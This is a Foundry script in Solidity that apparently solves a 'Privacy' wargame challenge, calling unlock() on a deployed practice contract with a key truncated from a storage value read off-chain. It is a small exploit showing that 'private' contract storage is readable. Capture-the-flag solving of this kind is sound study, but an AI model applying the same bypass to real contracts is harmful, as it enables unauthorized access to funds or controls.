pragma solidity ^0.8.0;

import "forge-std/Script.sol";
import "../challs/Privacy.sol";

contract PrivacyScript is Script {
    function run() external {
        vm.startBroadcast();
        // address c = address(0x16e59C3B820a4Cbf573A7cF658Ab7343a8496524);
        // c.call{value: 0}(abi.encodeWithSignature("unlock(bytes16)",(0xd17a5489f622fc30a2be48d229c3e91f)));
        Privacy p = Privacy(0x16e59C3B820a4Cbf573A7cF658Ab7343a8496524);
        bytes32 data = 0x36c7cc858fc93c0ca71665d950ca94e7d17a5489f622fc30a2be48d229c3e91f;
        p.unlock(bytes16(data));
    }
}